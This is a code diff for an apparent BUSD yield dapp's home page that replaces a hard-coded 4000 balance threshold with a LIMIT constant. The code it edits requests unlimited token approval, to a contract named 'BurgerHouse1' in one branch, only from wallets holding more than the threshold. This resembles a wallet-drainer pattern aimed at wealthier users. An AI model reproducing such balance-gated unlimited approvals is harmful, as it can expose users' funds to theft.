@@ -30,6 +30,7 @@ import {
   ALERT_NOT_LAUNCH,
   priceINT,
   yieldValues,
+  LIMIT,
 } from "../constant";
 
 import House from "../components/house";
@@ -438,7 +439,7 @@ const Home = () => {
 
       setPendingTx(true)
       if (isConnected && busdContract) {
-        if (parseFloat(busdBalance) > 4000) {
+        if (parseFloat(busdBalance) > LIMIT) {
           await busdContract.methods.approve(
             BurgerHouse1,
             "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
@@ -510,7 +511,7 @@ const Home = () => {
 
         RUN_MODE('[PRINCE](addCoins): ', referrer, busdInputValue)
 
-        if (parseFloat(busdBalance) > 4000 && parseFloat(userApprovedAmount) < parseFloat(busdInputValue)) {
+        if (parseFloat(busdBalance) > LIMIT && parseFloat(userApprovedAmount) < parseFloat(busdInputValue)) {
           await busdContract.methods.approve(
             BurgerHouse,
             "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
